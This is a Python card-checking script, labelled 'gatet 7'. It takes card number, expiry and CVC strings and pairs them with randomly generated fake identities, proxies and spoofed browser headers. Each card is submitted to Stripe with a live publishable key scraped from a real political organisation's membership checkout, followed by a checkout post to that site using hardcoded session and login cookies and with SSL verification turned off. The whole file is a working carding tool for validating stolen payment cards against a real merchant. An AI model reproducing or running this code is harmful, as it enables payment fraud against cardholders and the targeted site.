import requests
import re
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from colorama import Fore, Style
from proxy import reqproxy

#$5
def fake_user():
   response = requests.get('https://randomuser.me/api/1.2/?nat=us')
   data = response.text
   name_match = re.search(r'"first":"(.*?)"', data)
   name = name_match.group(1) if name_match else ''
   last_match = re.search(r'"last":"(.*?)"', data)
   last = last_match.group(1) if last_match else ''
   email_match = re.search(r'"email":"(.*?)"', data)
   email = email_match.group(1) if email_match else ''
   street_match = re.search(r'"street":"(.*?)"', data)
   street = street_match.group(1) if street_match else ''
   city_match = re.search(r'"city":"(.*?)"', data)
   city = city_match.group(1) if city_match else ''
   state_match = re.search(r'"state":"(.*?)"', data)
   state = state_match.group(1) if state_match else ''
   phone_match = re.search(r'"phone":"(.*?)"', data)
   phone = phone_match.group(1) if phone_match else ''
   postcode_match = re.search(r'"postcode":(.*?),', data)
   postcode = postcode_match.group(1) if postcode_match else ''
   return name, last, email, street, city, state, phone, postcode

def Tele7(ccx):
    session, ip_address = reqproxy()
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    if "20" in yy:
        yy = yy.split("20")[1]
   
    name, last, email, street, city, state, phone, postcode = fake_user()
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }

    data = f'type=card&billing_details[address][line1]=7104+NW+Prairie+View+Rd&billing_details[address][line2]=&billing_details[address][city]=Kansas+City&billing_details[address][state]=Mississippi&billing_details[address][postal_code]=64151&billing_details[address][country]=US&billing_details[name]=Rickey+Fadel&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=b80e14a2-8d25-4481-99f1-7505dc68df503f308b&muid=75e70308-7db1-499d-a341-1e7af83a373243c2b3&sid=513cb945-f974-4811-afca-1ba2e8ce08c6b3f4da&payment_user_agent=stripe.js%2F680542e9e4%3B+stripe-js-v3%2F680542e9e4%3B+split-card-element&referrer=https%3A%2F%2Fnorthville-mi.gop&time_on_page=1450615&key=pk_live_7q99xziIj5RSnW1maZQTUSnq00FDnBteLo'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
       id = response.json()['id']
       print(Fore.GREEN + "PM: ",id, "Proxy is Live: ", ip_address, "gatet7" + Style.RESET_ALL)
    except:
           return '#'
# Define the URL and headers
    url = 'https://northville-mi.gop/membership-account/membership-checkout/?level=4'

    headers1 = {
       'authority': 'northville-mi.gop',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://northville-mi.gop',
        'referer': 'https://northville-mi.gop/membership-account/membership-checkout/?level=4',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }
    
    data2 = {
    "AccountNumber": "XXXXXXXXXXXX5824",
    "CardType": "visa",
    "ExpirationMonth": "09",
    "ExpirationYear": "2029",
    "baddress1": "7104 NW Prairie View Rd",
    "baddress2": "",
    "bcity": "Kansas City",
    "bconfirmemail": "thih09089@bugfoo.com",
    "bcountry": "US",
    "bemail": "thih09089@bugfoo.com",
    "bfirstname": "Rickey",
    "blastname": "Fadel",
    "bphone": "8165848801",
    "bstate": "Mississippi",
    "bzipcode": "64151",
    "checkjavascript": "1",
    "javascriptok": "1",
    "level": "4",
    "payment_method_id": id,
    "submit-checkout": "1",
    }
    cookies = {
    "__stripe_mid": "75e70308-7db1-499d-a341-1e7af83a373243c2b3",
    "__stripe_sid": "513cb945-f974-4811-afca-1ba2e8ce08c6b3f4da",
    "_ga": "GA1.2.778981398.1697071797",
    "_ga_6PMTBLMYND": "GS1.1.1697071797.1.1.1697071913.0.0.0",
    "_gat_gtag_UA_247003414_1": "1",
    "_gid": "GA1.2.508462388.1697071799",
    "PHPSESSID": "5564f7650ff98091cfeee8b263c88a73",
    "pmpro_visit": "1",
    "wordpress_logged_in_6ff38e1f2d214257a412c6ea394b8281": 'bin0101%7C1698282165%7Cju1QVFjkdjpTXU9vtlVWAdD7HZ2jCQ8MbRkj9yIwQBF%7Ca8fe30aa3c89cc3dd56fa07ed90e10bfc3fe976b3382413539ec61c40e963f10',
    }
    
   # Make the POST request
    response = session.post(url, headers=headers1, data=data2, cookies=cookies, verify=False)  # Note: Set verify=False to disable SSL verification
    try:
       result2 = response.text
    except:
	    return "succeeded"
    return result2
print("working gatet 7")
